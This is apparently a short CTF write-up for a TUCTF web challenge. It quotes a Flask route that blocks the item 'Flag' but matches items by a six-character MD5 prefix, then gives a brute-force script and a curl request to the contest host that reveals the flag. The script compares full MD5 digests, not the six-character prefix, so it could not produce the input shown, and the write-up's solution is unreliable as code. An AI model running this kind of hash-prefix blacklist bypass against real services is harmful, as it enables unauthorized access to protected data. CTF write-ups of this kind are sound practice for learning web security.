The src code:
```py
@app.route("/review")
def reviewHandler():
    con = sqlite3.connect("shopping.db")
    cur = con.cursor()
    item = request.args.get("item")
    if item == "Flag":
        return("Blacklisted term detected")
    hash = hashlib.md5(item.encode()).hexdigest()
    result = cur.execute("SELECT * FROM items WHERE id=?", (hash[0:6],))
    try:
        result = result.fetchone()
        item = result[1]
    except:
        return (redirect("/"))
    return render_template("review.html",placeholder=item,price=result[2],desc=result[3],img=result[4])
```
I solved using the following script to bruteforce a string that have the hame md5 hash as 'Flag'
```py
import hashlib
import itertools
import string

def md5(text):
    return hashlib.md5(text.encode()).hexdigest()

def solution(target_hash):
    charset = string.ascii_letters + string.digits
    for length in range(5, 7):
        for combination in itertools.product(charset, repeat=length):
            res = ''.join(combination)
            print(res)
            if res == "Flag":
                continue 
            hash = md5(res)
            if hash == target_hash:
                return res
    return None

print(solution(md5("Flag")))

```
```
┌─[nguyenlong05@sw1mj3llyf1sh] - [~] - [Mon Jan 27, 21:38]
└─[$] <> curl 'https://shopping-time.tuctf.com/review?item=aMR2f' | grep TUCTF
        <Strong>Item description:</Strong> TUCTF{k1nd_0f_an_1d0r_vu1n!}
```